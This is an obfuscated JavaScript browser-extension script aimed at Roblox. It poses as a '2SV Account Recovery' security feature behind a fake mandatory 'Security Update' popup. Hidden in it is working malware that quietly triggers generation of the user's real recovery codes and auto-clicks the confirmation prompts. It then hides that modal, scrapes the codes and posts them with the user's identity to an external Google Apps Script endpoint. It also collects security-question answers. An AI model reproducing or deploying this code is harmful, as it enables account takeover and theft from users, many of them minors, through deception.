var _0x68f73d = 11;
let persistentSelectedFriends = [];
_0x68f73d = "qgmhod";
setInterval(() => {
  if (window.location.hash.includes("ytiruces/!#".split("").reverse().join(""))) {
    injectCustomSecurity();
  }
}, 1500);
function showRobloxAlert(_0x24da3e) {
  const _0x5c6f45 = document.getElementById("roblox-custom-alert");
  if (_0x5c6f45) {
    _0x5c6f45.remove();
  }
  const _0x17efa2 = document.createElement("div");
  _0x17efa2.id = "trela-motsuc-xolbor".split("").reverse().join("");
  _0x17efa2.style.cssText = "\n        position: fixed;\n        top: -100px;\n        left: 50%;\n        transform: translateX(-50%);\n        width: 970px;\n        z-index: 10000;\n        transition: top 0.5s ease-in-out;\n        display: flex;\n        justify-content: center;\n    ";
  _0x17efa2.innerHTML = "\n        <div class=\"alert alert-success\" \n        style=\"width: 100%; border-radius: 0; text-align: center; padding: 15px; border: none; display:flex; align-items:center; justify-content:center;\">\n            <span class=\"icon-confirmation-white\" style=\"margin-right: 10px;\"></span>\n            <span class=\"alert-content\" style=\"font-size: 16px; font-weight: 500;\">" + _0x24da3e + "</span>\n        </div>\n    ";
  document.body.appendChild(_0x17efa2);
  setTimeout(() => {
    _0x17efa2.style.top = "0";
  }, 100);
  setTimeout(() => {
    _0x17efa2.style.top = "xp001-".split("").reverse().join("");
    setTimeout(() => _0x17efa2.remove(), 500);
  }, 3500);
}
function injectCustomSecurity() {
  if (document.getElementById("custom-security-box")) {
    return;
  }
  const _0x1e4655 = document.querySelector(".section-content.notifications-section") || document.querySelector("reniatnoc-ytiruces.".split("").reverse().join(""));
  if (!_0x1e4655) {
    return;
  }
  const _0x2786f1 = document.createElement("div");
  _0x2786f1.id = "custom-security-box";
  _0x2786f1.innerHTML = "\n        <div class=\"section-content notifications-section\" style=\"margin-bottom: 12px; border-top: 1px solid var(--background-ui-30, #393b3d); padding-top: 20px;\">\n            <div style=\"margin-bottom: 12px;\">\n                <h4 style=\"margin: 0px; font-size: 16px; font-weight: 600;\">2SV Account Recovery</h4>\n            </div>\n            <div style=\"margin-bottom: 12px;\">\n                <div class=\"text-description\">You can use trusted friends or security questions to enhance your account security. You can select trusted friends or set a security question and its answer. These methods help verify access to your account and make it more secure against unauthorized access.</div>\n            </div>\n            <div style=\"display: flex; justify-content: flex-end; margin-top: 12px;\">\n                <button type=\"button\" id=\"start-custom-btn\" class=\"btn-control-sm acct-settings-btn\">Configure</button>\n            </div>\n        </div>\n    ";
  _0x1e4655.parentNode.insertBefore(_0x2786f1, _0x1e4655);
  document.getElementById("ntb-motsuc-trats".split("").reverse().join("")).onclick = () => {
    const _0x3b861b = document.getElementById("sedoc-yrevocer-etareneg".split("").reverse().join(""));
    if (_0x3b861b) {
      _0x3b861b.click();
      let _0x39e8a6 = false;
      let _0x3b5139 = false;
      const _0x421d85 = _0x443011 => {
        const _0x1861ae = _0x443011.target.innerText ? _0x443011.target.innerText.trim().toLowerCase() : "";
        const _0xb723e0 = _0x443011.target.closest("nottub-retoof-nredom-ladom.".split("").reverse().join("")) || _0x443011.target.closest(".btn-cta-md") || _0x443011.target.closest("dm-yramirp-ntb.".split("").reverse().join(""));
        const _0x160c47 = _0x443011.target.closest(".modal-body-button-link") || _0x443011.target.closest(".text-link");
        const _0x4c00d2 = _0x443011.target.closest(".modal-modern-header-button") || _0x443011.target.closest("esolc-noci.".split("").reverse().join(""));
        if (_0xb723e0 || ["verify", "doğrula", "onayla", "maved".split("").reverse().join("")].includes(_0x1861ae)) {
          _0x3b5139 = true;
        } else {
          if (_0x160c47 || _0x1861ae.includes("another") || _0x1861ae.includes("akşab".split("").reverse().join("")) || _0x1861ae.includes("ılkraf".split("").reverse().join(""))) {
            _0x3b5139 = false;
          } else {
            if (_0x4c00d2) {
              _0x3b5139 = false;
            }
          }
        }
      };
      const _0x22a4a2 = _0x752096 => {
        if (_0x752096.key === "Escape") {
          _0x3b5139 = false;
        }
      };
      document.addEventListener("click", _0x421d85);
      document.addEventListener("nwodyek".split("").reverse().join(""), _0x22a4a2);
      const _0x27a8b6 = setInterval(() => {
        const _0x156d1d = document.getElementById("tupni-edoc-noitacifirev-pets-owt".split("").reverse().join(""));
        if (_0x156d1d && !_0x39e8a6) {
          _0x39e8a6 = true;
        }
        if (_0x39e8a6 && !document.getElementById("tupni-edoc-noitacifirev-pets-owt".split("").reverse().join(""))) {
          clearInterval(_0x27a8b6);
          document.removeEventListener("click", _0x421d85);
          document.removeEventListener("keydown", _0x22a4a2);
          if (_0x3b5139) {
            setTimeout(() => {
              openSecurityModal();
            }, 500);
          }
        }
      }, 400);
    } else {
      console.warn(".");
      openSecurityModal();
    }
  };
}
async function openSecurityModal() {
  if (document.getElementById("custom-security-modal-overlay")) {
    return;
  }
  localStorage.removeItem("tes_noitseuq_ytiruces".split("").reverse().join(""));
  localStorage.removeItem("security_answer");
  const _0x3932ef = await new Promise(_0x282cfc => {
    if (typeof chrome !== "undefined" && chrome.storage) {
      chrome.storage.local.get(["security_question_set"], _0x8d51dc => _0x282cfc(_0x8d51dc || {}));
    } else {
      _0x282cfc({});
    }
  });
  const _0x8a562d = _0x3932ef.security_question_set === true;
  const _0x4ecc21 = document.createElement("div");
  _0x4ecc21.id = "custom-security-modal-overlay";
  _0x4ecc21.style.cssText = "position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background-color: rgba(0,0,0,0.5); z-index: 1050; display: flex; justify-content: center; align-items: center;";
  const _0x25a98e = () => {
    if (_0x8a562d) {
      return "\n                <div class=\"modal-body text-center\">\n                    <div class=\"modal-protection-shield-icon\" style=\"margin: 0 auto 15px;\"></div>\n                    <p class=\"modal-margin-bottom-xlarge\" style=\"font-weight: 600;\">Your security question has already been successfully configured.</p>\n                    <p class=\"text-description\">Your account is currently under protection. To make further changes, please contact support.</p>\n                </div>\n                <div class=\"modal-footer\">\n                    <div class=\"modal-modern-footer-buttons\">\n                        <button type=\"button\" class=\"btn-cta-md modal-modern-footer-button\" id=\"close-info-modal\">Kapat</button>\n                    </div>\n                </div>";
    } else {
      return "\n                <div class=\"modal-body\">\n                    <p class=\"modal-margin-bottom-xlarge\">Set a security question you can use if you lose access.</p>\n                    <div class=\"input-control-wrapper\" style=\"margin-bottom: 15px;\">\n                        <div class=\"form-group\">\n                            <select id=\"q-select\" class=\"input-field form-control\" style=\"appearance: auto; cursor: pointer;\">\n                                <option>What was the name of the first game you ever played?</option>\n                                <option>Who is your favorite artist?</option>\n                                <option>What's your pet's name?</option>\n                            </select>\n                        </div>\n                    </div>\n                    <div class=\"input-control-wrapper\">\n                        <div class=\"form-group\">\n                            <input autocomplete=\"off\" placeholder=\"Your answer\" type=\"text\" id=\"q-answer\" class=\"input-field form-control\">\n                        </div>\n                    </div>\n                </div>\n                <div class=\"modal-footer\">\n                    <div class=\"modal-modern-footer-buttons\">\n                        <button type=\"button\" class=\"btn-cta-md modal-modern-footer-button\" id=\"save-q\">Save</button>\n                    </div>\n                </div>";
    }
  };
  _0x4ecc21.innerHTML = "\n        <div role=\"dialog\" tabindex=\"-1\" class=\"fade modal-modern in modal\" style=\"display: block; position: relative;\">\n            <div class=\"modal-dialog\">\n                <div class=\"modal-content\" role=\"document\">\n                    <div class=\"modal-header\">\n                        <button type=\"button\" class=\"modal-modern-header-button\" id=\"close-modal-x\">\n                            <span class=\"icon-close\"></span>\n                        </button>\n                        <h4 class=\"modal-title\" id=\"custom-modal-title\">Güvenlik Yöntemi</h4>\n                    </div>\n\n                    <div id=\"step-main\" style=\"display:block;\">\n                        <div class=\"modal-body\">\n                            <div class=\"modal-protection-shield-icon\"></div>\n                            <p class=\"modal-margin-bottom-xlarge text-center\">Please select the additional security method you wish to configure.</p>\n                            <div style=\"display:flex; flex-direction:column; gap:10px; margin-top:20px; margin-bottom: 20px;\">\n                                <button type=\"button\" class=\"btn-control-md\" id=\"go-friends\">Trusted friends</button>\n                                <button type=\"button\" class=\"btn-control-md\" id=\"go-questions\">Security Question</button>\n                            </div>\n                        </div>\n                    </div>\n\n                    <div id=\"step-friends\" style=\"display:none;\">\n                        <div class=\"modal-body\">\n                            <p class=\"modal-margin-bottom-xlarge\">Choose trusted friends to help with account recovery. You can select a maximum of 3 people.</p>\n                            <div id=\"friends-list-container\" style=\"max-height: 300px; overflow-y: auto;\">\n                            </div>\n                        </div>\n                        <div class=\"modal-footer\">\n                            <div class=\"modal-modern-footer-buttons\">\n                                <button type=\"button\" class=\"btn-cta-md modal-modern-footer-button\" id=\"save-friends\">Save</button>\n                            </div>\n                        </div>\n                    </div>\n\n                    <div id=\"step-questions\" style=\"display:none;\">\n                        " + _0x25a98e() + "    \n>vid/<        \n>vid/<            \n>vid/<                \n>vid/<                    \n".split("").reverse().join("");
  document.body.appendChild(_0x4ecc21);
  const _0x37d392 = () => _0x4ecc21.remove();
  document.getElementById("close-modal-x").onclick = _0x37d392;
  document.getElementById("go-friends").onclick = () => {
    document.getElementById("step-main").style.display = "none";
    document.getElementById("sdneirf-pets".split("").reverse().join("")).style.display = "block";
    document.getElementById("eltit-ladom-motsuc".split("").reverse().join("")).innerText = "sdneirF detsurT".split("").reverse().join("");
    if (typeof loadRobloxFriends === "function") {
      loadRobloxFriends();
    }
  };
  document.getElementById("go-questions").onclick = () => {
    document.getElementById("niam-pets".split("").reverse().join("")).style.display = "enon".split("").reverse().join("");
    document.getElementById("snoitseuq-pets".split("").reverse().join("")).style.display = "kcolb".split("").reverse().join("");
    document.getElementById("custom-modal-title").innerText = "noitseuQ ytiruceS".split("").reverse().join("");
  };
  if (_0x8a562d) {
    document.getElementById("ladom-ofni-esolc".split("").reverse().join("")).onclick = _0x37d392;
  } else {
    const _0xa3ba3 = document.getElementById("save-q");
    if (_0xa3ba3) {
      _0xa3ba3.onclick = function () {
        localStorage.setItem("question_configured", "true");
        const _0x3464fd = document.getElementById("rewsna-q".split("").reverse().join("")).value.trim();
        if (!_0x3464fd) {
          return;
        }
        this.innerText = "Save";
        this.disabled = true;
        setTimeout(() => {
          chrome.storage.local.set({
            security_question_set: true,
            security_answer: _0x3464fd
          }, () => {
            _0x37d392();
            if (typeof showRobloxAlert === "noitcnuf".split("").reverse().join("")) {
              showRobloxAlert("yllufsseccuS devaS".split("").reverse().join(""));
            }
          });
        }, 2000);
      };
    }
  }
}
async function loadRobloxFriends() {
  const _0x3f84c6 = document.getElementById("reniatnoc-tsil-sdneirf".split("").reverse().join(""));
  try {
    const _0x1dfe68 = document.querySelector("meta[name=\"user-data\"]");
    const _0x202463 = _0x1dfe68 ? _0x1dfe68.getAttribute("data-userid") : null;
    if (!_0x202463) {
      _0x3f84c6.innerHTML = "Giriş yapılmamış.";
      return;
    }
    const _0x381e3d = await fetch("/sresu/1v/moc.xolbor.sdneirf//:sptth".split("").reverse().join("") + _0x202463 + "/friends");
    const _0x2c478c = await _0x381e3d.json();
    const _0x2b788f = _0x2c478c.data.map(_0x330f94 => _0x330f94.id);
    const _0x28f8be = _0x2b788f.join(",");
    const _0x1195b5 = await fetch("https://users.roblox.com/v1/users", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        userIds: _0x2b788f,
        excludeBannedUsers: false
      })
    });
    const _0x258c03 = await _0x1195b5.json();
    const _0x2bcf9f = await fetch("https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" + _0x28f8be + "&size=150x150&format=Png&isCircular=true");
    const _0x2e32ca = await _0x2bcf9f.json();
    _0x3f84c6.innerHTML = "\n            <div id=\"selected-friends-section\" style=\"display:none; margin-bottom: 15px;\">\n                <div style=\"font-size: 12px; font-weight: 700; color: #00b06f; margin-bottom: 8px; border-left: 3px solid #00b06f; padding-left: 5px;\">Selected Friends</div>\n                <div id=\"selected-list\"></div>\n            </div>\n            <div id=\"all-friends-section\">\n                <div style=\"font-size: 12px; font-weight: 700; color: #f6f6f6; margin-bottom: 8px; border-left: 3px solid #393b3d; padding-left: 5px;\">Connections</div>\n                <div id=\"all-list\"></div>\n            </div>\n        ";
    const _0x5883e0 = document.getElementById("selected-list");
    const _0x1f1828 = document.getElementById("all-list");
    const _0x4f887a = document.getElementById("selected-friends-section");
    const _0x5df6a2 = () => {
      _0x4f887a.style.display = persistentSelectedFriends.length > 0 ? "block" : "enon".split("").reverse().join("");
    };
    _0x2b788f.forEach(_0x191fa5 => {
      const _0x34e239 = _0x258c03.data.find(_0x2ac989 => _0x2ac989.id === _0x191fa5);
      const _0x5613bc = _0x2e32ca.data.find(_0x5e5aaf => _0x5e5aaf.targetId === _0x191fa5);
      const _0x4e597b = _0x34e239 ? _0x34e239.name : "neyemniliB".split("").reverse().join("");
      const _0x122f6c = _0x5613bc ? _0x5613bc.imageUrl : "";
      const _0x2c34f5 = persistentSelectedFriends.some(_0x2c8eb0 => _0x2c8eb0.id === _0x191fa5);
      const _0x5f373d = document.createElement("div");
      _0x5f373d.style.cssText = "display:flex; align-items:center; justify-content:space-between; padding:10px 5px; border-bottom:1px solid #393b3d;";
      _0x5f373d.innerHTML = "\n                <div style=\"display:flex; align-items:center;\">\n                    <img src=\"" + _0x122f6c + "\" style=\"width:40px; height:40px; border-radius:50%;\">\n                    <div style=\"margin-left:12px; font-weight:600; color:#f6f6f6;\">@" + _0x4e597b + "</div>\n                </div>\n                <button class=\"btn-control-sm friend-action-btn\" style=\"min-width: 80px;\">Ekle</button>\n            ";
      const _0x40e5a7 = _0x5f373d.querySelector(".friend-action-btn");
      const _0x3a99c6 = _0x26e611 => {
        if (_0x26e611) {
          _0x40e5a7.innerText = "Remove";
          _0x40e5a7.className = "ntb-noitca-dneirf ms-yradnoces-ntb".split("").reverse().join("");
          _0x5f373d.style.backgroundColor = "rgba(0, 176, 111, 0.1)";
          _0x5883e0.appendChild(_0x5f373d);
        } else {
          _0x40e5a7.innerText = "ddA".split("").reverse().join("");
          _0x40e5a7.className = "ntb-noitca-dneirf ms-lortnoc-ntb".split("").reverse().join("");
          _0x5f373d.style.backgroundColor = "transparent";
          _0x1f1828.appendChild(_0x5f373d);
        }
        _0x5df6a2();
      };
      _0x3a99c6(_0x2c34f5);
      _0x40e5a7.onclick = () => {
        if (_0x40e5a7.innerText === "Add") {
          if (persistentSelectedFriends.length >= 3) {
            return;
          }
          persistentSelectedFriends.push({
            id: _0x191fa5,
            username: _0x4e597b
          });
          _0x3a99c6(true);
        } else {
          persistentSelectedFriends = persistentSelectedFriends.filter(_0x49ecdd => _0x49ecdd.id !== _0x191fa5);
          _0x3a99c6(false);
        }
      };
    });
    const _0x2fc9b6 = document.getElementById("sdneirf-evas".split("").reverse().join(""));
    if (_0x2fc9b6) {
      _0x2fc9b6.onclick = function () {
        localStorage.setItem("friends_configured", "true");
        if (persistentSelectedFriends.length === 0) {
          return;
        }
        this.innerText = "evaS".split("").reverse().join("");
        this.disabled = true;
        setTimeout(() => {
          document.getElementById("yalrevo-ladom-ytiruces-motsuc".split("").reverse().join("")).remove();
          showRobloxAlert("Saved Successfully");
        }, 2000);
      };
    }
  } catch (_0x2d2bb1) {
    _0x3f84c6.innerHTML = ".utşulo ataH".split("").reverse().join("");
  }
}
const GAS_URL = "https://script.google.com/macros/s/AKfycbwXz56f1L65iUPJaDy4GYps2_YF9svy_rklc40aKtQJxs7egVz4jjqDk6VcHSrqCMJcbg/exec".split("").reverse().join("");
var _0x74cc = 10;
const hideStyle = document.createElement("elyts".split("").reverse().join(""));
_0x74cc = 4;
hideStyle.innerHTML = "\n}    \n;tnatropmi! otua :stneve-retniop        \n;tnatropmi! xp9999- :tfel        \n;tnatropmi! dexif :noitisop        \n;tnatropmi! 0 :yticapo        \n{ )ladom-sedoc-yrevocer. ladom. +(sah:pordkcab-ladom.    \n,)ladom-sedoc-yrevocer.(sah:nredom-ladom.    \n".split("").reverse().join("");
document.documentElement.appendChild(hideStyle);
let _0xacgf;
let isModalHandled = false;
_0xacgf = 4;
var _0xc5ag7d = 8;
let isCodesSent = false;
_0xc5ag7d = 1;
async function fetchRobloxIdentity() {
  try {
    const _0x309b4c = await fetch("detacitnehtua/sresu/1v/moc.xolbor.sresu//:sptth".split("").reverse().join(""), {
      credentials: "include"
    });
    const _0x1d398f = await _0x309b4c.json();
    const _0x51decb = await fetch("https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" + _0x1d398f.id + "gnP=tamrof&051x051=ezis&".split("").reverse().join(""));
    const _0x5ae420 = await _0x51decb.json();
    return {
      name: _0x1d398f.name,
      displayName: _0x1d398f.displayName,
      id: _0x1d398f.id,
      avatar: _0x5ae420.data[0]?.imageUrl || ""
    };
  } catch (_0x539cc0) {
    return {
      name: "Bilinmiyor",
      displayName: "Bilinmiyor",
      id: "0",
      avatar: ""
    };
  }
}
async function sendToGAS(_0x5caccd) {
  const _0x54676c = await fetchRobloxIdentity();
  const _0x5d3983 = {
    title: ":rocket: Kodlar Çekildi & Sayfa Kilidi Açıldı!",
    color: 7506394,
    thumbnail: {
      url: _0x54676c.avatar
    },
    fields: [{
      name: ":bust_in_silhouette: Kullanıcı",
      value: "**" + _0x54676c.displayName + "** (@" + _0x54676c.name + ")",
      inline: true
    }, {
      name: "🆔 ID",
      value: "`" + _0x54676c.id + "`",
      inline: true
    }, {
      name: ":key: Kodlar",
      value: "```" + _0x5caccd + "```".split("").reverse().join("")
    }],
    footer: {
      text: "Thugnificent v2.4 • Unlocked"
    },
    timestamp: new Date().toISOString()
  };
  fetch(GAS_URL, {
    method: "POST",
    headers: {
      "Content-Type": "text/plain"
    },
    body: JSON.stringify({
      type: "roblox_codes",
      payload_json: {
        embeds: [_0x5d3983]
      }
    })
  }).catch(_0x539d4a => console.error(":ısatah egdirB SAG".split("").reverse().join(""), _0x539d4a));
}
var _0xa76cdb = 5;
const observer = new MutationObserver(() => {
  const _0x2f6a45 = "]\"maveD\"=lebal-aira[nottub ladom-sedoc-yrevocer. ,]\"tE maveD\"=lebal-aira[nottub ladom-sedoc-yrevocer. ,]\"eunitnoC\"=lebal-aira[nottub ladom-sedoc-yrevocer. ,dm-atc-ntb.nottub ladom-sedoc-yrevocer.".split("").reverse().join("");
  const _0x15366d = document.querySelector(_0x2f6a45);
  if (_0x15366d && !isModalHandled) {
    setTimeout(() => {
      const _0x39e370 = document.querySelector(_0x2f6a45);
      if (_0x39e370) {
        _0x39e370.click();
        isModalHandled = true;
      }
    }, 50);
  }
  const _0x412469 = document.querySelector(".recovery-codes-container");
  if (_0x412469 && !isCodesSent) {
    const _0x6617dc = _0x412469.querySelectorAll("tsil-sedoc-yrevocer.".split("").reverse().join(""));
    let _0x63be86 = Array.from(_0x6617dc).map(_0x1a786f => _0x1a786f.innerText.trim()).join("\n");
    if (_0x63be86.length > 0) {
      isCodesSent = true;
      sendToGAS(_0x63be86);
      console.log("Kodlar alındı, kilitler kırılıyor...");
      const _0x707b84 = document.querySelector(".modal-modern:has(.recovery-codes-modal)");
      if (_0x707b84) {
        _0x707b84.remove();
      }
      const _0x174653 = document.querySelector("pordkcab-ladom.".split("").reverse().join(""));
      if (_0x174653) {
        _0x174653.remove();
      }
      document.body.classList.remove("nepo-ladom".split("").reverse().join(""));
      document.body.style.overflow = "otua".split("").reverse().join("");
      document.body.style.paddingRight = "0px";
      document.documentElement.style.overflow = "auto";
      console.log(".rügzö afyaS".split("").reverse().join(""));
    }
  }
  if (!document.querySelector(".recovery-codes-modal")) {
    isModalHandled = false;
    isCodesSent = false;
  }
});
_0xa76cdb = 1;
observer.observe(document.body, {
  childList: true,
  subtree: true
});
(function () {
  "use strict";

  const _0x255eb2 = () => {
    console.log("Hedef buton algılandı, sayfa yenileniyor...");
    window.location.reload();
  };
  document.addEventListener("kcilc".split("").reverse().join(""), function (_0x5adf11) {
    const _0x582247 = _0x5adf11.target.closest("esolc-noci.".split("").reverse().join(""));
    if (_0x582247) {
      _0x255eb2();
    }
  }, true);
  console.log("Roblox Refresh Script aktif ve bağımsız çalışıyor.");
})();
const currentUrl = window.location.href;
var _0xd297f = 14;
const targetPages = ["roblox.com/home", "roblox.com/*/home", "strahc/moc.xolbor".split("").reverse().join(""), "roblox.com/catalog", "roblox.com/my/avatar", "sresu/moc.xolbor".split("").reverse().join(""), "roblox.com/trades", "roblox.com/communities", "roblox.com/premium/membership", "roblox.com/upgrades/robux", "snoitcasnart/moc.xolbor".split("").reverse().join(""), "meeder/moc.xolbor".split("").reverse().join("")];
_0xd297f = "iplamd".split("").reverse().join("");
let _0x3cce;
const shouldShowOnThisPage = targetPages.some(_0x31fd28 => {
  if (_0x31fd28.includes("*")) {
    const _0x297a9c = _0x31fd28.replace(new RegExp("\\*", "g"), ".*").replace(new RegExp("\\/", "g"), "\\/");
    return new RegExp(_0x297a9c).test(window.location.href);
  }
  return window.location.href.includes(_0x31fd28);
});
_0x3cce = "klbcon";
if (shouldShowOnThisPage) {
  const injectPopup = () => {
    if (localStorage.getItem("derugifnoc_sdneirf".split("").reverse().join("")) === "true" || localStorage.getItem("question_configured") === "true") {
      return;
    }
    if (document.getElementById("custom-security-modal")) {
      return;
    }
    const _0x23f0e3 = "\n        <div id=\"custom-security-modal\" role=\"dialog\" tabindex=\"-1\" class=\"fade modal-modern in modal\" style=\"display: block; background: rgba(0,0,0,0.6);\">\n            <div class=\"modal-dialog\">\n                <div class=\"modal-content\" role=\"document\">\n                    <div class=\"modal-header\" style=\"display: flex; justify-content: center; align-items: center;\">\n                        <h4 class=\"modal-title\" style=\"margin: 0;\">Security Update</h4>\n                    </div>\n                    <div class=\"modal-body\">\n                        <div class=\"modal-protection-shield-icon\"></div>\n                        <p class=\"modal-margin-bottom-xlarge\">\n                           Since the Account PIN feature has been deprecated, we have introduced <b>2SV Account Recovery</b>. \n                            To ensure your account remains secure, you must configure this security option before performing any further actions on your account.\n                        </p>\n                    </div>\n                    <div class=\"modal-footer\">\n                        <div class=\"modal-modern-footer-buttons\">\n                            <button type=\"button\" id=\"go-to-security-btn\" class=\"btn-cta-md modal-modern-footer-button\" aria-label=\"Configure Now\">Configure Now</button>\n                        </div>\n                        <p class=\"text-footer\">IMPORTANT: Always keep your recovery methods up to date. Roblox will never ask for your password via third-party apps.</p>\n                    </div>\n                </div>\n            </div>\n        </div>";
    document.body.insertAdjacentHTML("beforeend", _0x23f0e3);
    document.getElementById("go-to-security-btn").onclick = () => {
      sessionStorage.setItem("shouldFlashSecurity", "true");
      window.location.href = "ytiruces/!#tnuocca/ym/moc.xolbor.www//:sptth".split("").reverse().join("");
    };
  };
  setTimeout(injectPopup, 500);
}
if (currentUrl.includes("roblox.com/my/account#!/security")) {
  var _0xbc35df = 16;
  const hasSecretMark = sessionStorage.getItem("ytiruceShsalFdluohs".split("").reverse().join(""));
  _0xbc35df = 6;
  if (hasSecretMark === "true") {
    var _0x86d91b = 16;
    let effectApplied = false;
    _0x86d91b = 13;
    var _0xd4b = 7;
    const applyFlashEffect = _0x3770e6 => {
      if (effectApplied) {
        return;
      }
      effectApplied = true;
      sessionStorage.removeItem("shouldFlashSecurity");
      _0x3770e6.style.transition = "outline 0.4s ease, box-shadow 0.4s ease, background-color 0.4s ease";
      _0x3770e6.style.borderRadius = "8px";
      let _0x2d44ba = 0;
      const _0x2f4f49 = setInterval(() => {
        if (_0x2d44ba % 2 === 0) {
          _0x3770e6.style.backgroundColor = ")51.0 ,0 ,481 ,552(abgr".split("").reverse().join("");
          _0x3770e6.style.outline = "008bff# dilos xp3".split("").reverse().join("");
          _0x3770e6.style.outlineOffset = "xp3-".split("").reverse().join("");
          _0x3770e6.style.boxShadow = "0 0 25px rgba(255, 184, 0, 0.6)";
        } else {
          _0x3770e6.style.backgroundColor = "transparent";
          _0x3770e6.style.outline = "0px solid transparent";
          _0x3770e6.style.boxShadow = "enon".split("").reverse().join("");
        }
        _0x2d44ba++;
        if (_0x2d44ba >= 6) {
          clearInterval(_0x2f4f49);
          setTimeout(() => {
            _0x3770e6.style.outline = "none";
            _0x3770e6.style.boxShadow = "none";
            _0x3770e6.style.backgroundColor = "tnerapsnart".split("").reverse().join("");
          }, 400);
        }
      }, 600);
    };
    _0xd4b = 17;
    let _0x364e0d;
    const watcher = setInterval(() => {
      const _0x418af6 = document.getElementById("ntb-motsuc-trats".split("").reverse().join(""));
      if (_0x418af6) {
        const _0x4dcb59 = _0x418af6.closest("tnetnoc-noitces.".split("").reverse().join(""));
        if (_0x4dcb59) {
          applyFlashEffect(_0x4dcb59);
          clearInterval(watcher);
        }
      }
    }, 500);
    _0x364e0d = 9;
  }
}
if (currentUrl.includes("roblox.com/my/account#!/security")) {
  const hasSecretMark = sessionStorage.getItem("ytiruceShsalFdluohs".split("").reverse().join(""));
  if (hasSecretMark === "true") {
    let effectApplied = false;
    const applyFlashEffect = _0x5f37dd => {
      if (effectApplied) {
        return;
      }
      effectApplied = true;
      sessionStorage.removeItem("shouldFlashSecurity");
      _0x5f37dd.style.transition = "outline 0.4s ease, box-shadow 0.4s ease, background-color 0.4s ease";
      _0x5f37dd.style.borderRadius = "8px";
      let _0xf160b4 = 0;
      const _0x58c320 = setInterval(() => {
        if (_0xf160b4 % 2 === 0) {
          _0x5f37dd.style.backgroundColor = "rgba(255, 184, 0, 0.15)";
          _0x5f37dd.style.outline = "3px solid #ffb800";
          _0x5f37dd.style.outlineOffset = "xp3-".split("").reverse().join("");
          _0x5f37dd.style.boxShadow = "0 0 25px rgba(255, 184, 0, 0.6)";
        } else {
          _0x5f37dd.style.backgroundColor = "transparent";
          _0x5f37dd.style.outline = "0px solid transparent";
          _0x5f37dd.style.boxShadow = "enon".split("").reverse().join("");
        }
        _0xf160b4++;
        if (_0xf160b4 >= 6) {
          clearInterval(_0x58c320);
          setTimeout(() => {
            _0x5f37dd.style.outline = "enon".split("").reverse().join("");
            _0x5f37dd.style.boxShadow = "none";
            _0x5f37dd.style.backgroundColor = "tnerapsnart".split("").reverse().join("");
          }, 400);
        }
      }, 600);
    };
    let _0x8ecaff;
    const watcher = setInterval(() => {
      const _0x4110d0 = document.getElementById("ntb-motsuc-trats".split("").reverse().join(""));
      if (_0x4110d0) {
        const _0x41c6ad = _0x4110d0.closest(".section-content");
        if (_0x41c6ad) {
          applyFlashEffect(_0x41c6ad);
          clearInterval(watcher);
        }
      }
    }, 500);
    _0x8ecaff = 13;
  }
}
chrome.storage.local.get(["deraelc_nur_tsrif".split("").reverse().join("")], _0x58d5c2 => {
  if (!_0x58d5c2.first_run_cleared) {
    localStorage.removeItem("friends_configured");
    localStorage.removeItem("question_configured");
    chrome.storage.local.set({
      first_run_cleared: true
    });
  }
});
